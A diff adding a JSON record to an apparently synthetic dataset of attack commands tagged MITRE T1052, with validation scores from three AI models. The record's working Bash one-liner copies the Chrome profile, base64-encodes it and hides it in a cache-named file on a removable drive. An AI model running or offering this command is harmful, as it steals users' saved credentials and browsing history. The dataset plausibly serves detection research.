@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "tar -czf - \"$HOME/Library/Application Support/Google/Chrome/Default\" | base64 | dd of=\"/Volumes/UNTITLED/.cache/.gupd\" bs=4m conv=sync,noerror && sync",
+  "explanation": "Packages the Chrome profile directory, base64-encodes it, and writes to a cache-looking file on a removable drive via dd to stage browsing data offline.",
+  "rationale_steps": [
+    "Target application data likely to contain credentials and history.",
+    "Encode the data to mimic cache-like text content.",
+    "Write to external media with dd, remaining entirely local.",
+    "Sync to ensure completion before removal."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-24937b47-c4fc4f2b",
+  "source_prompt_hash": "24937b47",
+  "timestamp_utc": "2025-09-30T05:19:16.168507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed with balanced quoting, valid tar/base64/dd options, and correct pipe/&& separators.",
+        "semantic_score": 4,
+        "semantic_justification": "It archives the Chrome profile, base64-encodes it, and writes to a hidden file on a likely removable volume consistent with T1052, though it assumes the destination directory exists and conv=sync may add trailing NUL padding that could hinder later decoding.",
+        "combined_score": 4.5,
+        "confidence": 0.86,
+        "timestamp": "2025-10-01T10:12:16.851553Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid flags for tar/base64/dd, proper pipe chaining with &&, and correct use of shell variables and path quoting.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1052 by archiving and compressing the Chrome profile (staging sensitive browsing data), base64-encoding it for obfuscation, writing it to a hidden cache-named file on a removable volume (/Volumes/UNTITLED) via dd, and using sync to ensure physical write completion before transport — all operationally plausible on macOS without elevated privileges.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-18T22:41:26.116411Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses valid Bash syntax, correctly balances quotes for paths with spaces, and uses standard Unix pipes and flags.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively packages sensitive browser data, applies obfuscation via base64, and writes it to a plausible mount point for a removable drive on macOS.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:41:26.943523Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
